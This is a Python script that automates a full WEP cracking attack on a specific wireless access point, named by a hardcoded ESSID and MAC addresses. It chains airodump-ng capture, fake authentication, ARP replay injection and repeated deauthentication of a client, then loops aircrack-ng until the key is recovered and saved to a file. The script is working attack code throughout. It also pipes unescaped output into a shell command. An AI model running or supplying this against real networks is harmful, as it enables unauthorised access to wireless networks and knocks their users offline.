import subprocess
import time
import sys
import shutil

def run_command_background(cmd):
    """Run command in the background"""
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

def run_command(cmd):
    """Run command and wait for it to complete, returning its output"""
    process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return process.stdout, process.stderr

def crack_wep():
    """Attempt to crack WEP and return success status and output"""
    stdout, _ = run_command("sudo aircrack-ng ./wep_attack-01.cap")
    return ("KEY FOUND!" in stdout), stdout

def extract_key(output):
    """Extract the key using grep with bash from the full output"""
    try:
        # Use echo to pass the output to grep through a pipe
        grep_command = f"echo '{output}' | grep 'KEY FOUND!' | grep -oP '\\[\\K[^]]*'"
        process = subprocess.run(grep_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        key = process.stdout.strip()
        return key if key else None
    except subprocess.CalledProcessError as e:
        print(f"Error extracting key: {e}")
        return None

def save_key(essid, key):
    """Save the found key to /mnt/data/ap_keys with essid, formatted correctly"""
    if key:  # Make sure the key is not None
        with open('/mnt/data/ap_keys', 'a') as file:
            file.write(f"{essid} {key}\n")
    else:
        print("No valid key was extracted.")

def main():
    essid = "T52GT"
    ap_mac = "18:1B:EB:FC:B0:74"
    your_mac = "00:40:f0:79:3d:6c"
    client_mac = "10:F6:0A:7A:8C:94"
    interface = "wlan0mon"
    channel = "6"

    airodump_proc = None
    arp_replay_proc = None

    try:
        # Start airodump-ng in background
        airodump_cmd = f"sudo airodump-ng {interface} --bssid {ap_mac} -c {channel} -w wep_attack"
        airodump_proc = run_command_background(airodump_cmd)
        print("Dumping Traffic...")

        # Perform fake authentication
        fake_auth_cmd = f"aireplay-ng -1 0 -e {essid} -a {ap_mac} -h {your_mac} {interface}"
        run_command(fake_auth_cmd)
        print("Executed Fake Authentication Attack...")

        # Start ARP replay attack in background
        arp_replay_attack_cmd = f"aireplay-ng -3 -b {ap_mac} -h {your_mac} {interface}"
        arp_replay_proc = run_command_background(arp_replay_attack_cmd)
        print("Executing ARP Request Reply Attack...")

        # Perform initial deauth
        deauth_cmd = f"sudo aireplay-ng -0 10 -a {ap_mac} -c {client_mac} {interface}"
        run_command(deauth_cmd)
        print("Sending Initial Deauthentication Packets...")

        time.sleep(5)

        # Attempt to crack WEP until successful
        success = False
        while not success:
            success, output = crack_wep()
            if success:
                key = extract_key(output)
                if key:
                    print(f"Success! WEP Key Found: {key}")
                    save_key(essid, key)
                    print(f"Key saved for {essid}: {key}")
                    # Proceed with moving the .cap file and any other cleanup
                else:
                    print("Failed to extract the key correctly.")
            else:
                print("Failed to crack WEP. Sending Additional Deauth Packets and Retrying...")
                run_command(deauth_cmd)
                time.sleep(5)  # Wait a bit before retrying

    except KeyboardInterrupt:
        print("\nInterrupted by user. Cleaning up...")
    finally:
        # Cleanup: stop background processes
        if airodump_proc:
            airodump_proc.terminate()
        if arp_replay_proc:
            arp_replay_proc.terminate()
        sys.exit(0)

if __name__ == "__main__":
    main()
